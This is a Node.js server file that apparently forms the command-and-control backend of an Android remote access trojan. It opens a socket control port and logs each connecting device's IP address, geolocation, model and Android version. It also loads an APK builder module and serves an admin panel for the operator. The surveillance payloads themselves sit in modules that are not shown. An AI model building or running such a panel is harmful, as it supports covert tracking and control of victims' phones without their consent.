// Author: Fahim Ahamed

const express = require('express');
const app = express();
const IO = require('socket.io');
const geoip = require('geoip-lite');
const path = require('path');

// Load required modules
const CONST = require('./includes/const');
const db = require('./includes/databaseGateway');
const logManager = require('./includes/logManager');
const clientManager = new (require('./includes/clientManager'))(db);
const apkBuilder = require('./includes/apkBuilder');

// Set global variables
global.CONST = CONST;
global.db = db;
global.logManager = logManager;
global.app = app;
global.clientManager = clientManager;
global.apkBuilder = apkBuilder;

// Socket Server Setup
const client_io = IO.listen(CONST.control_port);
client_io.sockets.pingInterval = 30000;

// Handle client connection
client_io.on('connection', (socket) => {
    socket.emit('welcome'); // Send welcome message to client

    const clientParams = socket.handshake.query || {}; // Get client params
    const clientAddress = socket.request.connection;
    const rawIP = clientAddress.remoteAddress || '0.0.0.0';
    const clientIP = rawIP.substring(rawIP.lastIndexOf(':') + 1); // Extract client IP

    let clientGeo = geoip.lookup(clientIP) || {}; // Get client geolocation

    // Connect client to manager
    clientManager.clientConnect(socket, clientParams.id || 'unknown', {
        clientIP,
        clientGeo,
        device: {
            model: clientParams.model || 'Unknown',
            manufacture: clientParams.manf || 'Unknown',
            version: clientParams.release || 'Unknown'
        }
    });

    // Debug: log all socket events
    if (CONST.debug) {
        const originalOnevent = socket.onevent;
        socket.onevent = function (packet) {
            const args = packet.data || [];
            originalOnevent.call(this, packet);
            packet.data = ["*"].concat(args);
            originalOnevent.call(this, packet);
        };

        socket.on("*", (event, data) => {
            console.log(`[DEBUG SOCKET] Event: ${event}`);
            console.log(data);
        });
    }
});

// Web Interface Setup
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'assets/views'));
app.use(express.static(path.join(__dirname, 'assets/webpublic')));
app.use(require('./includes/expressRoutes'));

// Start web server
app.listen(CONST.web_port, () => {
    console.log(`Admin panel running at http://localhost:${CONST.web_port}`);
    logManager.log('info', `Web UI started on port ${CONST.web_port}`);
});